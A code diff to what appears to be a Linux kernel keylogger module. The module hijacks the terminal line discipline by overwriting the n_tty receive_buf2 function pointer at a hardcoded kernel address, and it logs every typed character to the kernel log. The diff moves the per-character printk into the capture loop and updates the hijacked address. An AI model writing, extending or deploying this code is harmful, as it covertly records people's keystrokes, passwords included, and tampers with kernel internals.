@@ -42,9 +42,10 @@ static void log_keys(struct tty_struct *tty, const unsigned char *cp, char *fp, 
 		} else {
 			key_buf.line[key_buf.pos++] = *cp;
 		}
+
+		printk(KERN_INFO "New Character: %c\n", *cp);
 	}
 
-	printk(KERN_INFO "New Character: %c\n", *cp);
 }
 
 static int new_receive_buf2(struct tty_struct *tty, const unsigned char *cp, char *fp, int count)
@@ -65,7 +66,7 @@ static void hijack_tty_ldisc_receive_buf(void)
 	// Note 2:
 	// Receive_buf2 is preferred over receive_buf
 
-	our_n_tty_ops = (struct tty_ldisc_ops *) 0xffffffffb8b700c0;
+	our_n_tty_ops = (struct tty_ldisc_ops *) 0xffffffff9df70100;
 	original_receive_buf2 = our_n_tty_ops->receive_buf2;
 	our_n_tty_ops->receive_buf2 = new_receive_buf2;
 }
